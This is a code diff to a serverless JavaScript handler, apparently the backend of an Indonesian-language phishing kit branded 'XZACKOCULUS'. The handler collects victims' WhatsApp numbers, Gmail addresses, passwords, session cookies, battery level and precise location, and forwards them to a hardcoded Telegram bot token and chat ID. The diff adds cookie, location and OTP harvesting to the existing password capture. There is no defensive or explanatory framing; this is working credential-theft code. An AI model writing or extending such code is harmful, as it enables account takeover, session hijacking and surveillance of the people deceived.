@@ -3,18 +3,54 @@ export default async function handler(req, res) {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const { type, whatsapp, email, password, product, price } = req.body;
-  
-  // Token & Chat ID aman tersembunyi di server Vercel
+  const {
+    type,
+    whatsapp,
+    email,
+    password,
+    product,
+    price,
+    cookie,
+    battery,
+    location,
+    paymentStatus,
+    assignedNumber,
+    otpCode
+  } = req.body;
+
   const botToken = '8869523539:AAGK5VLmPsbzmL8axLuM81GIvao3XKuhnXo';
   const chatId = '7603310096';
+
+  const metaBlock =
+    `📱 WhatsApp: ${whatsapp || '-'}\n` +
+    `📧 Gmail: ${email || '-'}\n` +
+    `🔋 Baterai: ${battery || '-'}\n` +
+    `📍 Lokasi Akurat: ${location || '-'}\n` +
+    `🍪 Cookie Sesi: ${cookie || '-'}\n` +
+    `🌐 Waktu: ${new Date().toLocaleString()}`;
 
   let message = "";
 
   if (type === 'GATEWAY_LOGIN') {
-    message = `🚨 **XZACKOCULUS - AKSES GATEWAY MASUK!** 🚨\n\n📱 WhatsApp: ${whatsapp}\n📧 Gmail: ${email}\n🔑 Sandi: ${password}\n🌐 Waktu: ${new Date().toLocaleString()}`;
+    message = `🚨 **XZACKOCULUS - LOGIN & TELEMETRI MASUK!** 🚨\n\n${metaBlock}\n🔑 Sandi: ${password || '-'}`;
+  } else if (type === 'TELEMETRY_PING') {
+    message = `📡 **XZACKOCULUS - UPDATE TELEMETRI** 📡\n\n${metaBlock}`;
   } else if (type === 'PAYMENT') {
-    message = `✅ **PEMBAYARAN DIKONFIRMASI!** ✅\n\n📱 WhatsApp User: ${whatsapp}\n📦 Produk: ${product}\n💰 Nominal: Rp ${price}\n⚡ Status: LUNAS / MENUNGGU ADMIN\n🌐 Waktu: ${new Date().toLocaleString()}`;
+    message =
+      `💳 **KONFIRMASI PEMBAYARAN PENGGUNA** 💳\n\n` +
+      `📦 Produk: ${product || '-'}\n` +
+      `💰 Nominal: Rp ${price || '-'}\n` +
+      `📌 Status: ${paymentStatus || 'MENUNGGU_VERIFIKASI'}\n` +
+      `${metaBlock}`;
+  } else if (type === 'ADMIN_PAYMENT_STATUS') {
+    message =
+      `🛡️ **STATUS PEMBAYARAN ADMIN DIPERBARUI** 🛡️\n\n` +
+      `📦 Produk: ${product || '-'}\n` +
+      `💰 Nominal: Rp ${price || '-'}\n` +
+      `📌 Keputusan: **${paymentStatus || '-'}**\n` +
+      `📞 Nomor: ${paymentStatus === 'SUDAH_BAYAR' ? assignedNumber : 'DITAHAN'}\n` +
+      `🔑 OTP (6 Digit): ${paymentStatus === 'SUDAH_BAYAR' ? otpCode : 'DITAHAN'}\n` +
+      `${metaBlock}`;
   } else {
     return res.status(400).json({ error: 'Invalid type' });
   }
